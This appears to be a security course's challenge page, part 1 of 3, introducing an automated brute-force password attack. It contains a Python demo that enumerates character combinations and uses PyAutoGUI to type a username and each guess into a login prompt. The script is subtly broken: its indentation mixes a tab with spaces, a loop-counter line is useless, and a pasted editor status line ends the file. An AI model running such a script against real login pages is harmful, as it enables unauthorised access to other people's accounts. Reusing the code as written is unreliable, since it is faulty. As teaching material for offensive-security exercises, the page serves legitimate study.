# Ops Challenge - Automated Brute Force Wordlist Attack Tool Part 1 of 3

## Demo Code

The demo code below introduces concepts necessary to complete the challenge.

This example code uses PyAutoGUI to cycle through the alphabet.

```python

import itertools
import time
import pyautogui

Alphabet = ("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-_.")
CharLength = 1
username = "youremail@domain.com"

for Index in range(25):
    passwords = (itertools.product(Alphabet, repeat = Index))
	for i in passwords:
        i = str(i)
        i = i.replace("[", "")
        i = i.replace("]", "")
        i = i.replace("'", "")
        i = i.replace(" ", "")
        i = i.replace(",", "")
        i = i.replace("(", "")
        i = i.replace(")", "")
        pyautogui.typewrite(username)
        pyautogui.keyDown("enter")
        pyautogui.keyUp("enter")
        pyautogui.typewrite(i)
        pyautogui.keyDown("enter")
        pyautogui.keyUp("enter")
    Index += 1

```
"DEMO.md" 45L, 1015C                                                                                                                                                 1,1           Top


